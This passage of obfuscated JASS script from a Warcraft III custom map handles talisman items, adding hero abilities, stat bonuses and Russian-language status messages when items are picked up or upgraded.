call TriggerRegisterPlayerChatEvent(Hc,Player(5),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(6),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(7),"-n",false)
call TriggerAddAction(Hc,function Bs5)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterPlayerEvent(Hc,Player(0),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(1),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(2),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(3),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(4),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(5),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(6),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(Hc,Player(7),EVENT_PLAYER_END_CINEMATIC)
call TriggerAddAction(Hc,function Bs7)
set Hc=null
endfunction
function Bs9 takes nothing returns nothing
local item g4=GetManipulatedItem()
local unit g5=GetTriggerUnit()
local integer g6=GetPlayerId(GetOwningPlayer(g5))+1
if IsUnitType(g5,UNIT_TYPE_HERO)==true then
if GetItemTypeId(g4)==$49304F58 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304F58))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41304D42)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+100,false)
set TQ[g6]=TQ[g6]+.06
set UJ[g6]=UJ[g6]+6
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetItemTypeId(g4)==$49304836 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304836))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41305A4A)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
set Nf[g6]=Nf[g6]+.06
set UK[g6]=UK[g6]+6
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetItemTypeId(g4)==$49304835 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304835))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41313433)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+100,false)
set N0[g6]=N0[g6]+.06
set UI[g6]=UI[g6]+6
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetItemTypeId(g4)==$49304837 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304837))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41305A4C)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+100,false)
set Nd[g6]=Nd[g6]+.06
set UH[g6]=UH[g6]+6
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetItemTypeId(g4)==$49304838 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304838))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41305A4B)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+100,false)
set Ng[g6]=Ng[g6]+.06
set UG[g6]=UG[g6]+6
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetItemTypeId(g4)==$49304F57 then
if GetUnitAbilityLevel(g5,$41305A37)<1 then
call RemoveItem(nP(g5,$49304F57))
call UnitAddAbility(g5,$41305A37)
call UnitAddAbility(g5,$41305035)
call ne(g5,"Вы приобрели талисман!",.023,255,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+50,false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set UM[g6]=UM[g6]+4
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
if GetItemTypeId(g4)==$49304F59 then
if GetItemUserData(g4)==10 or GetItemUserData(g4)==GetPlayerId(GetOwningPlayer(g5))+1 then
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4C)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41305A4C,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+50,false)
set Nd[g6]=Nd[g6]+.03
set UH[g6]=UH[g6]+3
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41304D42)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41304D42,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set TQ[g6]=TQ[g6]+.03
set UJ[g6]=UJ[g6]+3
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4A)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41305A4A,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
set Nf[g6]=Nf[g6]+.03
set UK[g6]=UK[g6]+3
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41313433)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41313433,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set N0[g6]=N0[g6]+.03
set UI[g6]=UI[g6]+3
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4B)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41305A4B,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+50,false)
set Ng[g6]=Ng[g6]+.03
set UG[g6]=UG[g6]+3
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305035)==1 then
call RemoveItem(nP(g5,$49304F59))
call SetUnitAbilityLevel(g5,$41305035,2)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+25,false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+25,false)
set UM[g6]=UM[g6]+2
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
endif
endif
if GetItemTypeId(g4)==$49304953 then
if GetItemUserData(g4)==10 or GetItemUserData(g4)==GetPlayerId(GetOwningPlayer(g5))+1 then
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41304D42)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41304D42,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set TQ[g6]=TQ[g6]+.03
set UJ[g6]=UJ[g6]+3
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4A)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41305A4A,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
set Nf[g6]=Nf[g6]+.03
set UK[g6]=UK[g6]+3
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41313433)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41313433,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set N0[g6]=N0[g6]+.03
set UI[g6]=UI[g6]+3
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4C)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41305A4C,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+50,false)
set Nd[g6]=Nd[g6]+.03
set UH[g6]=UH[g6]+3
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4B)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41305A4B,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+50,false)
set Ng[g6]=Ng[g6]+.03
set UG[g6]=UG[g6]+3
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305035)==2 then
call RemoveItem(nP(g5,$49304953))
call SetUnitAbilityLevel(g5,$41305035,3)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+25,false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+25,false)
set UM[g6]=UM[g6]+2
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
endif
endif
if GetItemTypeId(g4)==$49305435 then
if GetItemUserData(g4)==10 or GetItemUserData(g4)==GetPlayerId(GetOwningPlayer(g5))+1 then
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41304D42)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41304D42,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set TQ[g6]=TQ[g6]+.03
set UJ[g6]=UJ[g6]+3
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4A)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41305A4A,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
set Nf[g6]=Nf[g6]+.03
set UK[g6]=UK[g6]+3
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41313433)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41313433,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set N0[g6]=N0[g6]+.03
set UI[g6]=UI[g6]+3
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4C)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41305A4C,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+50,false)
set Nd[g6]=Nd[g6]+.03
set UH[g6]=UH[g6]+3
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4B)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41305A4B,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+50,false)
set Ng[g6]=Ng[g6]+.03
set UG[g6]=UG[g6]+3
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305035)==3 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41305035,4)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+25,false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+25,false)
set UM[g6]=UM[g6]+2
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
endif
endif
if GetItemTypeId(g4)==$49305A52 then
if GetItemUserData(g4)==10 or GetItemUserData(g4)==GetPlayerId(GetOwningPlayer(g5))+1 then
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41304D42)==4 then
call RemoveItem(nP(g5,$49305435))
call SetUnitAbilityLevel(g5,$41304D42,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set TQ[g6]=TQ[g6]+.03
set UJ[g6]=UJ[g6]+3
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4A)==4 then
call RemoveItem(nP(g5,$49305A52))
call SetUnitAbilityLevel(g5,$41305A4A,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
set Nf[g6]=Nf[g6]+.03
set UK[g6]=UK[g6]+3
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41313433)==4 then
call RemoveItem(nP(g5,$49305A52))
call SetUnitAbilityLevel(g5,$41313433,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+50,false)
set N0[g6]=N0[g6]+.03
set UI[g6]=UI[g6]+3
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4C)==4 then
call RemoveItem(nP(g5,$49305A52))
call SetUnitAbilityLevel(g5,$41305A4C,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+50,false)
set Nd[g6]=Nd[g6]+.03
set UH[g6]=UH[g6]+3
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305A4B)==4 then
call RemoveItem(nP(g5,$49305A52))
call SetUnitAbilityLevel(g5,$41305A4B,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+50,false)
set Ng[g6]=Ng[g6]+.03
set UG[g6]=UG[g6]+3
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A37)==1 then
if GetUnitAbilityLevel(g5,$41305035)==4 then
call RemoveItem(nP(g5,$49305A52))
call SetUnitAbilityLevel(g5,$41305035,5)
call ne(g5,"Вы улучшили талисман!",.023,0,255,0)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+25,false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+25,false)
set UM[g6]=UM[g6]+2
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
endif
endif
endif
set g4=null
set g5=null
endfunction
function BtB takes nothing returns nothing
local trigger g3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(g3,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(g3,function Bs9)
set g3=null
endfunction
function BtC takes nothing returns nothing
local unit g5=GetTriggerUnit()
local integer g6=GetPlayerId(GetOwningPlayer(g5))+1
if IsUnitType(g5,UNIT_TYPE_HERO)==true then
if GetUnitAbilityLevel(g5,$41304D42)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+(50+GetUnitAbilityLevel(g5,$41304D42)*50),false)
set TQ[g6]=TQ[g6]+(.03+.03*GetUnitAbilityLevel(g5,$41304D42))
set UJ[g6]=UJ[g6]+(3+3*GetUnitAbilityLevel(g5,$41304D42))
set g7[g6-1]="|cFF0080FFТалисман жизни|r ["+I2S(GetUnitAbilityLevel(g5,$41304D42))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41304D42))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41304D42))+"% Жизни|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A4A)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
set Nf[g6]=Nf[g6]+(.03+.03*GetUnitAbilityLevel(g5,$41305A4A))
set UK[g6]=UK[g6]+(3+3*GetUnitAbilityLevel(g5,$41305A4A))
set g7[g6-1]="|cFF0080FFТалисман защиты|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4A))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4A))+" Защиты|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4A))+"% Защиты|r"
endif
endif
if GetUnitAbilityLevel(g5,$41313433)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+(50+GetUnitAbilityLevel(g5,$41313433)*50),false)
set N0[g6]=N0[g6]+(.03+.03*GetUnitAbilityLevel(g5,$41313433))
set UI[g6]=UI[g6]+(3+3*GetUnitAbilityLevel(g5,$41313433))
set g7[g6-1]="|cFF0080FFТалисман магии|r ["+I2S(GetUnitAbilityLevel(g5,$41313433))+"]"
